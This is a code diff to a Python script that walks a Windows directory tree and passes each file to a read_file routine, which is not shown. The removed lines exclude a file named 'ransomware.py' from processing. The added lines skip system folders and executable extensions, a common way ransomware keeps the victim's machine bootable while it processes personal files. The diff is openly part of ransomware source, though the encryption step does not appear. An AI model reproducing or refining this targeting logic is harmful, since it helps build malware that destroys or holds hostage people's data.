@@ -1,37 +1,23 @@
 import os, sys
 from colorama import Fore, init
-import time 
+import time
 from tqdm import tqdm
-#Windows
+
+# Windows
 init()
 
 file_list = []
 file_e = []
+carpetas_excluidas = ['AppData', 'Program Files', 'ProgramData', 'Windows']
+extensiones_excluidas = ['.sys', '.dll', '.exe', '.bat', '.cmd', '.key']
 
 def searching_files(base_directory):
-    with tqdm(
-        total=500000,  
-        unit="file",
-        desc=Fore.BLUE + "[*] Searching files"+ Fore.RESET,
-        bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.BLUE, Fore.RESET)) as pbar:
-    
-        for root, _, files in os.walk(base_directory):
-            for file in files:
-                if file == 'ransomware.py' or file == 'allfiles1.py':
-                    full_route = os.path.join(root, file)
-                    file_e.append(full_route)
-                else: 
-                    full_route = os.path.join(root, file)
-                    read_file(full_route)
-
-                pbar.update(1)
-                #time.sleep(0.2)
-    pbar.close()
-    sys.stdout.flush()
-    print(f"{Fore.GREEN}[!] Total files found: {len(file_list)}")
-    #print(f"{Fore.YELLOW}{file_list}")
-
-
+    for root, dirs, files in os.walk(base_directory):
+        dirs[:] = [d for d in dirs if d not in carpetas_excluidas]
+        for file in files:
+            if not any(file.lower().endswith(ext) for ext in extensiones_excluidas):
+                full_route = os.path.join(root, file)
+                read_file(full_route)
 
 
 
